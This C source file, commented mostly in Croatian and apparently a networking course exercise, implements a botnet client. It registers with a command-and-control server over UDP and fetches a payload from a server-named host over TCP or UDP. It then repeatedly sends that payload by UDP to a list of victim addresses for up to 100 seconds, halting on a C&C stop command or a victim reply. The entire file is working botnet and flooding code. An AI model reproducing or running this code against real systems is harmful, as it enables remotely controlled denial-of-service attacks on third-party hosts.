#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <err.h>
#include <errno.h>
#include <netdb.h>
#include <math.h>

#define DEBUG 0

#include <poll.h>
#include "struktura.h"
#include "wrapper.h"
#include "deb.h"

#define MAX_LEN 1024
#define BROJ_SEKUNDI 100
#define BROJ_SOCKETA 10

void unesi_ip_port(struct poruka *messg, struct sockaddr_in *adrese, int *size) {
	
	struct addrinfo hints, *res;

	struct zrtva *zr = messg->zrtve;
	
	
	while ((strcmp(zr->IP,"")) != 0) {
		
		 memset(&hints, 0, sizeof(hints));
		 
		 Getaddrinfo(zr->IP, zr->PORT, &hints, &res);
		 
		 memcpy(adrese, res->ai_addr, sizeof(struct sockaddr_in));

		 
		 adrese++;
		 zr++;
		 (*size)++;
		 freeaddrinfo(res);
	}
}


void make_udp_connection(char *payload, char *ip, char *port) {
		
	struct addrinfo hints, *res;
	int mysocket;
	char hello[] = "HELLO\n";
	char pay[1024];
	socklen_t velicina;
	
	//For recvfrom
	struct timeval read_timeout;
	read_timeout.tv_sec = 1;
	read_timeout.tv_usec = 0;
	int greska;
	
	//Get server address
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;
	
	Getaddrinfo(ip, port, &hints, &res);
	
	//Get socket
	mysocket = Socket(res->ai_family, res->ai_socktype, 0);
	
	//Set option for non-blocking recvfrom
	Setsockopt(mysocket, SOL_SOCKET, SO_RCVTIMEO, &read_timeout, sizeof(read_timeout));
	
	//Send
	velicina = sizeof(struct sockaddr_in);
	Sendto(mysocket, hello, strlen(hello), 0, res->ai_addr, velicina);
	
	//Recieve payload
	greska = recvfrom(mysocket, pay, sizeof(pay), 0, res->ai_addr, &velicina);
	if (greska == -1){
		 close(mysocket);
		 errx(1, "Recvfrom timeout! Check the command you have sent!\n");
	}
	
	//Terminate string
	pay[strlen(pay)-1] = '\0';
	strcpy(payload, pay);
	
	freeaddrinfo(res);
	close(mysocket);

	return;	
}

void make_tcp_connection(char *payload, char *ip, char *port) {
	 
	struct addrinfo hints, *res;
	int mysocket;
	int mysocket1;
	char hello[] = "HELLO\n";
	char pay[1024];
	
	//For recvfrom
	struct timeval read_timeout;
	read_timeout.tv_sec = 1;
	read_timeout.tv_usec = 0;
	int greska;
	
	//Get server address
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	Getaddrinfo(ip, port, &hints, &res);
	
	//Get socket
	mysocket = Socket(res->ai_family, res->ai_socktype, 0);
	mysocket1 = Socket (PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	
	//Set option for non-blocking recvfrom
	Setsockopt(mysocket, SOL_SOCKET, SO_RCVTIMEO, &read_timeout, sizeof(read_timeout));
	
	//First you need to connect in order to use send
	greska = connect(mysocket, res->ai_addr, res->ai_addrlen);
	if (greska == -1) {
		errx(1, "Can't connect to the TCP server. Check the command you have sent!\n");
	}
	
	//Send server HELLO
	Send(mysocket, hello, strlen(hello), 0);
	
	//Wait for response (payload)
	Recv(mysocket, pay, sizeof(pay), 0);
	
	//set terminated
	pay[strlen(pay)-1] = '\0';
	strcpy(payload, pay);
	
	//Print payload i want to see it
	//printf("PAYLOAD %s\n", payload);
	
	
	freeaddrinfo(res);
	close(mysocket);
	close(mysocket1);

	return;
}

//////////////////////
// POCETAK PROGRAMA //
//////////////////////


int main(int argc, char** argv) {
	
	//Optional Values
	char* ip;
	char* port;

	char sbuff[] = "REG\n";
	
	//For finding C&C
	struct addrinfo hints, *res;
	int mysocketCandc;
	
	//Getting from C&C
	socklen_t velicina;
	struct poruka com;	//command from C&C
	
	//For getting many sockets
	char payload[MAX_LEN]; 		//payload for malloc
	
	//Check for entry
	int firstEntry = 0;
	
	//Polling variables
	int sockarray[BROJ_SOCKETA];
	int counter = 0;
	
	struct sockaddr_in adresa[20]; 	//Used for function
	int size = 0;
	struct pollfd pdfs[BROJ_SOCKETA];
	
	//Payload array
	char *token;
	int payloadCounter = 0;
	char *array[10];
	
	int i,j,h,m;
	
	//Now polling function
	int pollCount = 0;
	int timeWait = 1000; //miliseconds
	int l;
	struct sockaddr_in klijent;
	socklen_t velicina2;


	///////////////////////////////////
	//KRAJ INICIJALIZACIJE VARIJABLI //
	///////////////////////////////////


	//Provjeri je li dobar broj argumenata zadan
	if (argc != 3) errx(1, "Usage: ./bot server_ip server_port");
	
	ip = argv[1];
	port = argv[2];
	
	//Get address for C&C
	memset(&hints, 0, sizeof(hints));
	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;
	hints.ai_flags = NI_NUMERICSERV | NI_NUMERICHOST;

	Getaddrinfo(ip, port, &hints, &res);
	
	mysocketCandc = Socket(PF_INET, SOCK_DGRAM, 0);
	sockarray[counter++] = mysocketCandc;
	
	//Send REG to C&C
	Sendto(mysocketCandc, sbuff, strlen(sbuff), 0,  res->ai_addr, res->ai_addrlen);
	
	//Accept from C&C
	velicina = sizeof(struct sockaddr);
	
	memset(&com, 0, sizeof(com));
	
	do {
		Recvfrom(mysocketCandc, &com, sizeof(com), 0, res->ai_addr, &velicina);
		
		DEB("PRIMIO SAM NESTO \n");
		PDEB("COM. %c, IP %s, PORT, %s\n", com.command, com.zrtve[0].IP, com.zrtve[0].PORT);
		
		//Check that first Entry is '0' or '1' or '2'
		if (firstEntry == 0) {
			if (com.command == '0' || com.command == '1' || com.command == '2') firstEntry = 1;
			else {
				com.command = '1';
				continue;
			}
		}
		
		//Break while, RUN!
		if (com.command == '3') break;
		else if (!(com.command == '0' || com.command == '1' || com.command == '2')){
			com.command = '1';
			continue;
		}
		
		//Make TCP connection
		if (com.command == '1') {
			make_tcp_connection(payload, com.zrtve[0].IP , com.zrtve[0].PORT);
								
		}
		//Make UDP connection
		else if (com.command == '2') {
			make_udp_connection(payload, com.zrtve[0].IP, com.zrtve[0].PORT);
		}
		else if (com.command == '0') {
			
			printf("Dobio sam broj '0' u command, gasim bot...\n");
			return 0;
		}
		PDEB("Dobiveni payload: %s\n", payload);
		
	} while (com.command == '1' || com.command == '2');
	
	
	
	///////////////
	// POLLING ////
	///////////////
	
	unesi_ip_port(&com, &adresa[0], &size);
	
	//Make for every socket -> listener
	for (m=0; m<size; ++m) {
		sockarray[counter] = Socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
		counter++;
	}
	
	
	//Set everything for polling
	for (int i = 0; i<counter; ++i) {
		pdfs[i].fd = sockarray[i];
		pdfs[i].events = POLLIN;
	}
	
	//Get payload splitted ':', find out number of ":"
	token = strtok(payload, ":");
	
	while (token != NULL) {
		array[payloadCounter] = token;
		token = strtok(NULL, ":");
		payloadCounter++;
	}
	
	
	//Start sending: 1-number of sec, 2. number of victims, 3. number of sockets, 4. number of payloads
	for (j=0; j<BROJ_SEKUNDI; ++j) {
		for (i=0; i<size; ++i) {
			//for (k=1; k<counter; ++k) {
				for (h=0; h<payloadCounter; ++h) {
					Sendto(pdfs[1].fd , array[h], strlen(array[h]), 0, (struct sockaddr *)&(adresa[i]), sizeof(struct sockaddr_in));
				}
			//}
		}
		
		pollCount = poll(&pdfs[0], counter, timeWait);
		if (pollCount == -1) errx(1, "Pollcount greska");
		
		if (pollCount == 0) continue;
		printf("DOBIO SAM NESTO!");
		
		//Polling
		for (l=0; l<counter; ++l) {
			
			//Found socket!
			if (pdfs[l].revents & POLLIN) {
				
				//Ako je prvi
				if (pdfs[l].fd == pdfs[0].fd) {
					memset(&com, 0, sizeof(com));
					velicina2 = sizeof(struct sockaddr);
					Recvfrom(pdfs[l].fd, &com, sizeof(com), 0, (struct sockaddr *)&klijent, &velicina);
					
					//If it's C&C, i need to check Command
					if (com.command == '4') {

							printf("I got '4' from C&C, stopping sending messages...\n");
							
							//break nested loop
							j=BROJ_SEKUNDI;
							break;
					}
					else {
						printf("I got sth from C&C but command was not number '4', continuing...\n");
					}
				}
				//It's "zrtva", so I need to check anything
				
				else {				
					printf("Victim sent me a message, breaking...\n");
					j=BROJ_SEKUNDI;
					break;
				}
			}
		}
	}
	
	
	freeaddrinfo(res);
	
	return 0;
}
